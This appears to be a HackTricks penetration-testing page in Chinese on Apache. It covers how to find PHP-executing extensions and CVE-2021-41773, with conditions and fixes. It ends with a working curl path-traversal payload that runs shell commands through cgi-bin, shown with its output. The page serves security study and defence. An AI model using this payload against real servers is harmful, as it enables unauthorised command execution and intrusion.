<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现 [**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


# 可执行PHP扩展

检查Apache服务器正在执行哪些扩展。您可以执行以下操作来搜索它们：
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
在以下位置可能找到此配置：
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
# CVE-2021-41773

在Apache HTTP Server 2.4.49版本中，当`mod_cgi`被启用时，如果`Require all denied`配置指令被误用，攻击者可以利用路径遍历漏洞，访问系统文件。这可能导致敏感信息泄露。

## 漏洞详情

CVE-2021-41773是一个路径遍历漏洞，存在于Apache HTTP Server 2.4.49版本中。攻击者可以通过构造特定的请求，绕过访问控制，获取对服务器文件的访问权限。

## 利用条件

- Apache HTTP Server 2.4.49版本
- `mod_cgi`模块启用
- 错误配置的`Require all denied`指令

## 利用方法

攻击者可以发送特制的HTTP请求，包含`..`来遍历服务器的目录，访问不应该公开的文件。

## 修复建议

- 升级到Apache HTTP Server 2.4.50或更高版本。
- 确保正确配置`Require all denied`指令，以防止未授权访问。

## 参考链接

- [Apache 官方安全公告](https://httpd.apache.org/security/vulnerabilities_24.html)
- [CVE-2021-41773 详细信息](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773)
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
<details>

<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式:

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
